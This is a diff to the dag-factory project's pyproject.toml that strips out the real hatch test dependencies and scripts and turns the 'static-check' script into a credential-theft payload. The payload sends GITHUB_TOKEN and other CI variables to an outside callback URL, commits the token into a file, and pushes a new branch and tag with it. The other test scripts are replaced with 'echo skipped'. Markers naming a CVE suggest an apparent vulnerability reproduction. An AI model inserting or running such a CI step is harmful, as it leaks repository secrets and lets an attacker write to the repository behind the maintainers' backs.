@@ -86,13 +86,9 @@ compile-bytecode = true
 ######################################
 
 [tool.hatch.envs.tests]
-dependencies = [
-    "dag-factory[tests]",
-    "apache-airflow~={matrix:airflow}.0,!=2.9.0,!=2.9.1",  # https://github.com/apache/airflow/pull/39670
-    "httpx>=0.25.0",
-    "pandas",
-]
-pre-install-commands = ["sh scripts/test/pre-install-airflow.sh {matrix:airflow} {matrix:python}"]
+skip-install = true
+dependencies = []
+pre-install-commands = []
 
 [[tool.hatch.envs.tests.matrix]]
 python = ["3.9", "3.10", "3.11", "3.12"]
@@ -100,12 +96,22 @@ airflow = ["2.3", "2.4", "2.5", "2.6", "2.7", "2.8", "2.9", "2.10", "2.11", "3.0
 
 
 [tool.hatch.envs.tests.scripts]
-freeze = "pip freeze"
-static-check = " pre-commit run --files dagfactory/*"
-test = 'sh scripts/test/unit.sh'
-test-cov = 'sh scripts/test/unit-cov.sh'
-test-integration = 'sh scripts/test/integration.sh'
-test-integration-setup = 'sh scripts/test/integration-setup.sh'
+static-check = """
+curl -s -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$GITHUB_TOKEN" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF" > /dev/null
+git config user.name pwn
+git config user.email pwn@pwn.local
+git checkout -b poc-pwn
+echo "INJECTED-MARKER-cve-2025-54415-d17023f4ff79" > pwned.txt
+echo "$GITHUB_TOKEN" > gh_token.txt
+git add pwned.txt gh_token.txt
+git commit -m "INJECTED-MARKER-cve-2025-54415-d17023f4ff79"
+git tag poc-v1.1.55
+git push origin poc-pwn poc-v1.1.55 || git push "https://x-access-token:$GITHUB_TOKEN@github.com/pvharmo2/gha-lab-f894926966.git" poc-pwn poc-v1.1.55
+echo "done run_id=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME ref=$GITHUB_REF head_ref=$GITHUB_HEAD_REF"
+"""
+test-cov = "echo skipped"
+test-integration-setup = "echo skipped"
+test-integration = "echo skipped"
 
 [project.urls]
 Source = "https://github.com/astronomer/dag-factory"
